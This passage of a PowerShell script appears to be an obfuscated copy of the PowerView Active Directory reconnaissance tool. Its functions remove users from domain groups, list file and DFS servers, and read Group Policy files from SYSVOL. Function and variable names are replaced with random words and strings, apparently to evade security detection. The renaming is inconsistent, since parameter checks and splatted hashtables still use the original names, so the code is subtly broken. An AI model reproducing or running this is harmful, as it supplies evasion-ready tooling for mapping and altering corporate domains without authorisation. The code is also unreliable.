    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $soGjewdO99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $mACTrMID99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $OIjgjDtk99 = @{
            'Identity' = $soGjewdO99
        }
        if ($PSBoundParameters['Domain']) { $OIjgjDtk99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Credential']) { $OIjgjDtk99['Credential'] = $fxunRYJT99 }
        $almFoXbH99 = ethnologist @ContextArguments
        if ($almFoXbH99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($almFoXbH99.Context, $almFoXbH99.Identity)
            }
            catch {
                Write-Warning "[boxwood] Error finding the group identity '$soGjewdO99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($pWTNPYLI99 in $mACTrMID99) {
                if ($pWTNPYLI99 -match '.+\\.+') {
                    $OIjgjDtk99['Identity'] = $pWTNPYLI99
                    $eejOPAgi99 = ethnologist @ContextArguments
                    if ($eejOPAgi99) {
                        $DGKWisJq99 = $eejOPAgi99.Identity
                    }
                }
                else {
                    $eejOPAgi99 = $almFoXbH99
                    $DGKWisJq99 = $pWTNPYLI99
                }
                Write-Verbose "[boxwood] Removing member '$pWTNPYLI99' from group '$soGjewdO99'"
                $pWTNPYLI99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($eejOPAgi99.Context, $DGKWisJq99)
                $Group.Members.Remove($pWTNPYLI99)
                $Group.Save()
            }
        }
    }
}
function nitrated {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function airmailing {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $sMQTvMNR99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($QNLwMLiv99 in $UtXBFQsM99) {
                $sMQTvMNR99['Domain'] = $QNLwMLiv99
                $LRJpxUZv99 = bleachers @SearcherArguments
                $(ForEach($beqGXKdp99 in $LRJpxUZv99.FindAll()) {if ($beqGXKdp99.Properties['homedirectory']) {airmailing($beqGXKdp99.Properties['homedirectory'])}if ($beqGXKdp99.Properties['scriptpath']) {airmailing($beqGXKdp99.Properties['scriptpath'])}if ($beqGXKdp99.Properties['profilepath']) {airmailing($beqGXKdp99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $LRJpxUZv99 = bleachers @SearcherArguments
            $(ForEach($beqGXKdp99 in $LRJpxUZv99.FindAll()) {if ($beqGXKdp99.Properties['homedirectory']) {airmailing($beqGXKdp99.Properties['homedirectory'])}if ($beqGXKdp99.Properties['scriptpath']) {airmailing($beqGXKdp99.Properties['scriptpath'])}if ($beqGXKdp99.Properties['profilepath']) {airmailing($beqGXKdp99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function terrestrials {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $OGajjPbh99 = 'All'
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        function fleshed {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $OizfIGSV99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $yKHJVOhm99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $gqSThzCi99 = 8
            $aRjlXMoY99 = @()
            for($i=1; $i -le $yKHJVOhm99; $i++){
                $cHlmHOXY99 = $gqSThzCi99
                $XPfavPqp99 = $gqSThzCi99 + 1
                $FUzlsKah99 = [bitconverter]::ToUInt16($bin[$cHlmHOXY99..$XPfavPqp99],0)
                $MonPwssv99 = $XPfavPqp99 + 1
                $LoihoCfh99 = $MonPwssv99 + $FUzlsKah99 - 1
                $CzFRsgiZ99 = [System.Text.Encoding]::Unicode.GetString($bin[$MonPwssv99..$LoihoCfh99])
                $svDWeAss99 = $LoihoCfh99 + 1
                $fYMiNcNU99 = $svDWeAss99 + 3
                $ZSxRCYBc99 = [bitconverter]::ToUInt32($bin[$svDWeAss99..$fYMiNcNU99],0)
                $DPqEHTuY99 = $fYMiNcNU99 + 1
                $PtGZVrsF99 = $DPqEHTuY99 + $ZSxRCYBc99 - 1
                $IQRlEfSF99 = $bin[$DPqEHTuY99..$PtGZVrsF99]
                switch -wildcard ($CzFRsgiZ99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $TFAasIHg99 = 0
                        $KdJXMrCx99 = 15
                        $YjMtUECa99 = [byte[]]$IQRlEfSF99[$TFAasIHg99..$KdJXMrCx99]
                        $guid = New-Object Guid(,$YjMtUECa99) # should match $YRaAWgrN99
                        $fajPkzrZ99 = $KdJXMrCx99 + 1
                        $hvfNsOsL99 = $fajPkzrZ99 + 1
                        $IcsbiyVB99 = [bitconverter]::ToUInt16($IQRlEfSF99[$fajPkzrZ99..$hvfNsOsL99],0)
                        $PYwUGQEJ99 = $hvfNsOsL99 + 1
                        $ydLqVhol99 = $PYwUGQEJ99 + $IcsbiyVB99 - 1
                        $dzmpmetr99 = [System.Text.Encoding]::Unicode.GetString($IQRlEfSF99[$PYwUGQEJ99..$ydLqVhol99])
                        $BNgNJnEC99 = $ydLqVhol99 + 1
                        $EjuppyjL99 = $BNgNJnEC99 + 1
                        $oXFYnkxL99 = [bitconverter]::ToUInt16($IQRlEfSF99[$BNgNJnEC99..$EjuppyjL99],0)
                        $fXXnysrH99 = $EjuppyjL99 + 1
                        $hJYZahQI99 = $fXXnysrH99 + $oXFYnkxL99 - 1
                        $xyLMvOpV99 = [System.Text.Encoding]::Unicode.GetString($IQRlEfSF99[$fXXnysrH99..$hJYZahQI99])
                        $OkIUGFyP99 = $hJYZahQI99 + 1
                        $dGmegqJa99 = $OkIUGFyP99 + 3
                        $type = [bitconverter]::ToUInt32($IQRlEfSF99[$OkIUGFyP99..$dGmegqJa99],0)
                        $YITdcTqX99 = $dGmegqJa99 + 1
                        $mnWehNNG99 = $YITdcTqX99 + 3
                        $state = [bitconverter]::ToUInt32($IQRlEfSF99[$YITdcTqX99..$mnWehNNG99],0)
                        $diiZfDjx99 = $mnWehNNG99 + 1
                        $KXSESLmu99 = $diiZfDjx99 + 1
                        $OaLcNTMy99 = [bitconverter]::ToUInt16($IQRlEfSF99[$diiZfDjx99..$KXSESLmu99],0)
                        $oDWEHlFg99 = $KXSESLmu99 + 1
                        $aUxPZpBQ99 = $oDWEHlFg99 + $OaLcNTMy99 - 1
                        if ($OaLcNTMy99 -gt 0)  {
                            $XrgtvKek99 = [System.Text.Encoding]::Unicode.GetString($IQRlEfSF99[$oDWEHlFg99..$aUxPZpBQ99])
                        }
                        $FKytkxLt99 = $aUxPZpBQ99 + 1
                        $tJfolaCf99 = $FKytkxLt99 + 7
                        $CTMUZVBU99 = $IQRlEfSF99[$FKytkxLt99..$tJfolaCf99] #dword lowDateTime #dword highdatetime
                        $WaRkfuOM99 = $tJfolaCf99 + 1
                        $pTMWvrir99 = $WaRkfuOM99 + 7
                        $FqYahYwF99 = $IQRlEfSF99[$WaRkfuOM99..$pTMWvrir99]
                        $nCtKRlck99 = $pTMWvrir99 + 1
                        $pXgsFUsO99 = $nCtKRlck99 + 7
                        $RyryvqRd99 = $IQRlEfSF99[$nCtKRlck99..$pXgsFUsO99]
                        $hqhoaNne99 = $pXgsFUsO99  + 1
                        $ejEXftJN99 = $hqhoaNne99 + 3
                        $OGajjPbh99 = [bitconverter]::ToUInt32($IQRlEfSF99[$hqhoaNne99..$ejEXftJN99],0)
                        $uekbNeyE99 = $ejEXftJN99 + 1
                        $VkOGxTHo99 = $uekbNeyE99 + 3
                        $cOINlILH99 = [bitconverter]::ToUInt32($IQRlEfSF99[$uekbNeyE99..$VkOGxTHo99],0)
                        $rlPhOCaf99 = $VkOGxTHo99 + 1
                        $lEfSmcPk99 = $rlPhOCaf99 + $cOINlILH99 - 1
                        $nSMZznMn99 = $IQRlEfSF99[$rlPhOCaf99..$lEfSmcPk99]
                        $tyXisppS99 = $lEfSmcPk99 + 1
                        $NGMpRJrN99 = $tyXisppS99 + 3
                        $VMjIuhpq99 = [bitconverter]::ToUInt32($IQRlEfSF99[$tyXisppS99..$NGMpRJrN99],0)
                        $cssVzdTj99 = $NGMpRJrN99 + 1
                        $UkqEdrpL99 = $cssVzdTj99 + $VMjIuhpq99 - 1
                        $YMxpIwXP99 = $IQRlEfSF99[$cssVzdTj99..$UkqEdrpL99]
                        $wrOZDBcJ99 = $UkqEdrpL99 + 1
                        $MQSHxUWY99 = $wrOZDBcJ99 + 3
                        $EwsjGHQp99 = [bitconverter]::ToUInt32($IQRlEfSF99[$wrOZDBcJ99..$MQSHxUWY99],0)
                        $qwcsrhqq99 = 0
                        $aEgQBvtI99 = $qwcsrhqq99 + 3
                        $QVoUFzcJ99 = [bitconverter]::ToUInt32($nSMZznMn99[$qwcsrhqq99..$aEgQBvtI99],0)
                        $amhAYLHS99 = $aEgQBvtI99 + 1
                        for($j=1; $j -le $QVoUFzcJ99; $j++){
                            $ZrpkgJsU99 = $amhAYLHS99
                            $vJARJkVB99 = $ZrpkgJsU99 + 3
                            $iAOgUaSC99 = [bitconverter]::ToUInt32($nSMZznMn99[$ZrpkgJsU99..$vJARJkVB99],0)
                            $lqOTLprz99 = $vJARJkVB99 + 1
                            $TDWsaBVZ99 = $lqOTLprz99 + 7
                            $VxOYgaje99 = $nSMZznMn99[$lqOTLprz99..$TDWsaBVZ99]
                            $eSSuFkGk99 = $TDWsaBVZ99 + 1
                            $MXyhpgJk99 = $eSSuFkGk99 + 3
                            $bEhfvUmw99 = [bitconverter]::ToUInt32($nSMZznMn99[$eSSuFkGk99..$MXyhpgJk99],0)
                            $ZZmRVuWm99 = $MXyhpgJk99 + 1
                            $OQNSEEBS99 = $ZZmRVuWm99 + 3
                            $EWwFNEYF99 = [bitconverter]::ToUInt32($nSMZznMn99[$ZZmRVuWm99..$OQNSEEBS99],0)
                            $FmDYMUYs99 = $OQNSEEBS99 + 1
                            $jHiUOwwm99 = $FmDYMUYs99 + 1
                            $dflSrWsy99 = [bitconverter]::ToUInt16($nSMZznMn99[$FmDYMUYs99..$jHiUOwwm99],0)
                            $JHzyhczv99 = $jHiUOwwm99 + 1
                            $DyiuNCii99 = $JHzyhczv99 + $dflSrWsy99 - 1
                            $MzxEgeXB99 = [System.Text.Encoding]::Unicode.GetString($nSMZznMn99[$JHzyhczv99..$DyiuNCii99])
                            $YGifPTOi99 = $DyiuNCii99 + 1
                            $TzOdjxTW99 = $YGifPTOi99 + 1
                            $HFRAmbVd99 = [bitconverter]::ToUInt16($nSMZznMn99[$YGifPTOi99..$TzOdjxTW99],0)
                            $GGSaGHqR99 = $TzOdjxTW99 + 1
                            $KzjtCEMo99 = $GGSaGHqR99 + $HFRAmbVd99 - 1
                            $nJwAmbaO99 = [System.Text.Encoding]::Unicode.GetString($nSMZznMn99[$GGSaGHqR99..$KzjtCEMo99])
                            $dLCEVPFh99 += "\\$MzxEgeXB99\$nJwAmbaO99"
                            $amhAYLHS99 = $KzjtCEMo99 + 1
                        }
                    }
                }
                $gqSThzCi99 = $PtGZVrsF99 + 1
                $VBtuwEDv99 = @{
                    'Name' = $CzFRsgiZ99
                    'Prefix' = $dzmpmetr99
                    'TargetList' = $dLCEVPFh99
                }
                $aRjlXMoY99 += New-Object -TypeName PSObject -Property $VBtuwEDv99
                $dzmpmetr99 = $Null
                $CzFRsgiZ99 = $Null
                $dLCEVPFh99 = $Null
            }
            $aKKCTwhr99 = @()
            $aRjlXMoY99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $aKKCTwhr99 += $_.split('\')[2]
                    }
                }
            }
            $aKKCTwhr99
        }
        function Kewpie {
            [CmdletBinding()]
            Param(
                [String]
                $UtXBFQsM99,
                [String]
                $nedSgaYy99,
                [String]
                $YBAlGqrU99,
                [String]
                $daZTeEQR99 = 'Subtree',
                [Int]
                $JFYciBwT99 = 200,
                [Int]
                $qaKJUqzZ99,
                [Switch]
                $mIpZvziV99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
            )
            $pUKiLcKL99 = bleachers @PSBoundParameters
            if ($pUKiLcKL99) {
                $COxUQWyP99 = @()
                $pUKiLcKL99.filter = '(&(objectClass=fTDfs))'
                try {
                    $mKhNNgkp99 = $pUKiLcKL99.FindAll()
                    $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                        $rtPnFfWd99 = $_.Properties
                        $PAbbuhKI99 = $rtPnFfWd99.remoteservername
                        $Pkt = $rtPnFfWd99.pkt
                        $COxUQWyP99 += $PAbbuhKI99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$rtPnFfWd99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[terrestrials] Kewpie error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($mKhNNgkp99) {
                        try { $mKhNNgkp99.dispose() }
                        catch {
                            Write-Verbose "[terrestrials] Kewpie error disposing of the Results object: $_"
                        }
                    }
                    $pUKiLcKL99.dispose()
                    if ($pkt -and $pkt[0]) {
                        fleshed $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$rtPnFfWd99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[terrestrials] Kewpie error : $_"
                }
                $COxUQWyP99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function dissects {
            [CmdletBinding()]
            Param(
                [String]
                $UtXBFQsM99,
                [String]
                $nedSgaYy99,
                [String]
                $YBAlGqrU99,
                [String]
                $daZTeEQR99 = 'Subtree',
                [Int]
                $JFYciBwT99 = 200,
                [Int]
                $qaKJUqzZ99,
                [Switch]
                $mIpZvziV99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
            )
            $pUKiLcKL99 = bleachers @PSBoundParameters
            if ($pUKiLcKL99) {
                $COxUQWyP99 = @()
                $pUKiLcKL99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $pUKiLcKL99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $mKhNNgkp99 = $pUKiLcKL99.FindAll()
                    $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                        $rtPnFfWd99 = $_.Properties
                        $dLCEVPFh99 = $rtPnFfWd99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($dLCEVPFh99[2..($dLCEVPFh99.Length-1)])
                        $COxUQWyP99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $RwAjqvqq99 = $_.InnerText
                                if ( $RwAjqvqq99.Contains('\') ) {
                                    $BuTmSgRH99 = $RwAjqvqq99.split('\')[3]
                                    $HBOFnZpM99 = $rtPnFfWd99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$BuTmSgRH99$HBOFnZpM99";'RemoteServerName'=$RwAjqvqq99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[terrestrials] dissects error in parsing target : $_"
                            }
                        }
                    }
                    if ($mKhNNgkp99) {
                        try { $mKhNNgkp99.dispose() }
                        catch {
                            Write-Verbose "[terrestrials] Error disposing of the Results object: $_"
                        }
                    }
                    $pUKiLcKL99.dispose()
                }
                catch {
                    Write-Warning "[terrestrials] dissects error : $_"
                }
                $COxUQWyP99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $COxUQWyP99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($QNLwMLiv99 in $UtXBFQsM99) {
                $sMQTvMNR99['Domain'] = $QNLwMLiv99
                if ($OGajjPbh99 -match 'all|1') {
                    $COxUQWyP99 += Kewpie @SearcherArguments
                }
                if ($OGajjPbh99 -match 'all|2') {
                    $COxUQWyP99 += dissects @SearcherArguments
                }
            }
        }
        else {
            if ($OGajjPbh99 -match 'all|1') {
                $COxUQWyP99 += Kewpie @SearcherArguments
            }
            if ($OGajjPbh99 -match 'all|2') {
                $COxUQWyP99 += dissects @SearcherArguments
            }
        }
        $COxUQWyP99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function Swahili {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $rRVtYxUN99,
        [Switch]
        $brFzsnlQ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $TQltWjOh99 = @{}
    }
    PROCESS {
        try {
            if (($rRVtYxUN99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $qjxeaWQv99 = "\\$((New-Object System.Uri($rRVtYxUN99)).Host)\SYSVOL"
                if (-not $TQltWjOh99[$qjxeaWQv99]) {
                    Staci -Path $qjxeaWQv99 -fxunRYJT99 $fxunRYJT99
                    $TQltWjOh99[$qjxeaWQv99] = $True
                }
            }
            $FMnXvItp99 = $rRVtYxUN99
            if (-not $FMnXvItp99.EndsWith('.inf')) {
                $FMnXvItp99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[Swahili] Parsing GptTmplPath: $FMnXvItp99"
            if ($PSBoundParameters['OutputObject']) {
                $ANerVaWv99 = Victorian -Path $FMnXvItp99 -brFzsnlQ99 -ErrorAction Stop
                if ($ANerVaWv99) {
                    $ANerVaWv99 | Add-Member Noteproperty 'Path' $FMnXvItp99
                    $ANerVaWv99
                }
            }
            else {
                $ANerVaWv99 = Victorian -Path $FMnXvItp99 -ErrorAction Stop
                if ($ANerVaWv99) {
                    $ANerVaWv99['Path'] = $FMnXvItp99
                    $ANerVaWv99
                }
            }
        }
        catch {
            Write-Verbose "[Swahili] Error parsing $FMnXvItp99 : $_"
        }
    }
    END {
        $TQltWjOh99.Keys | ForEach-Object { outsmarts -Path $_ }
    }
}
function articulating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $bHigRLGR99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $TQltWjOh99 = @{}
    }
    PROCESS {
        try {
            if (($bHigRLGR99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $qjxeaWQv99 = "\\$((New-Object System.Uri($bHigRLGR99)).Host)\SYSVOL"
                if (-not $TQltWjOh99[$qjxeaWQv99]) {
                    Staci -Path $qjxeaWQv99 -fxunRYJT99 $fxunRYJT99
                    $TQltWjOh99[$qjxeaWQv99] = $True
                }
            }
            [XML]$VLyyHtTF99 = Get-Content -Path $bHigRLGR99 -ErrorAction Stop
            $VLyyHtTF99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $YGzKEtMK99 = $_.Properties.groupName
                $aFyvxhjk99 = $_.Properties.groupSid
                if (-not $aFyvxhjk99) {
                    if ($YGzKEtMK99 -match 'Administrators') {
                        $aFyvxhjk99 = 'S-1-5-32-544'
                    }
                    elseif ($YGzKEtMK99 -match 'Remote Desktop') {
                        $aFyvxhjk99 = 'S-1-5-32-555'
                    }
                    elseif ($YGzKEtMK99 -match 'Guests') {
                        $aFyvxhjk99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $aFyvxhjk99 = secedes -NUBJRpba99 $YGzKEtMK99 -fxunRYJT99 $fxunRYJT99
                        }
                        else {
                            $aFyvxhjk99 = secedes -NUBJRpba99 $YGzKEtMK99
                        }
                    }
                }
                $mACTrMID99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($mACTrMID99) {
                    if ($_.filters) {
                        $CexMpdpZ99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $CexMpdpZ99 = $Null
                    }
                    if ($mACTrMID99 -isnot [System.Array]) { $mACTrMID99 = @($mACTrMID99) }
                    $VymSPmVh99 = New-Object PSObject
                    $VymSPmVh99 | Add-Member Noteproperty 'GPOPath' $ZsYWdJFs99
                    $VymSPmVh99 | Add-Member Noteproperty 'Filters' $CexMpdpZ99
                    $VymSPmVh99 | Add-Member Noteproperty 'GroupName' $YGzKEtMK99
                    $VymSPmVh99 | Add-Member Noteproperty 'GroupSID' $aFyvxhjk99
                    $VymSPmVh99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $VymSPmVh99 | Add-Member Noteproperty 'GroupMembers' $mACTrMID99
                    $VymSPmVh99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $VymSPmVh99
                }
            }
        }
        catch {
            Write-Verbose "[articulating] Error parsing $ZsYWdJFs99 : $_"
        }
    }
    END {
        $TQltWjOh99.Keys | ForEach-Object { outsmarts -Path $_ }
    }
}
function adolescents {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $soGjewdO99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OoANhkqg99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $DGKWisJq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $vBiUoQqq99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($vBiUoQqq99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $FygKDmRG99 = @()
                if ($sMQTvMNR99['Properties']) {
                    $AFsRDrHH99 = $sMQTvMNR99['Properties']
                }
                $sMQTvMNR99['Properties'] = 'distinguishedname,dnshostname'
                $RkkOlRkn99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $sMQTvMNR99['Identity'] = $OoANhkqg99
